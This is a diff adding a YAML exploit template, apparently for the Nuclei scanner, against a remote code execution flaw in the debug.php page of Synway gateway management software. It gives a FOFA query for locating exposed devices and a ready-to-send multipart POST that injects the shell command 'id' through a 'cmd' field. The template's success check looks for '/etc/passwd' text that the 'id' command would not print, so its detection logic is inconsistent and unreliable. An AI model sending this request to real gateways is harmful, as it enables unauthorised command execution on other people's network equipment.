@@ -1,0 +1,39 @@
+id: sanhui-gateway-debugphp-rce
+
+info:
+  name: Synway-网关管理软件 debug.php 远程代码执行漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="Synway-网关管理软件"
+        Synway-网关管理软件是部署于企业及数据中心的高性能网络网关解决方案，其架构包含协议处理引擎和安全管理模块。该系统通过集成防火墙、VPN、负载均衡及流量控制功能，实现网络流量的智能化调度与安全防护。经分析发现，其debug.php组件存在代码注入缺陷，攻击者可利用该漏洞在目标系统上执行任意命令。
+  tags: 杭州三汇网关
+
+http:
+- raw:
+  - |
+    POST /debug.php HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+    Connection: close
+
+    ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+    Content-Disposition: form-data; name="comdtype"
+    1
+
+    ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+    Content-Disposition: form-data; name="cmd"
+
+    id
+    ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+    Content-Disposition: form-data; name="run"
+
+    ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0'
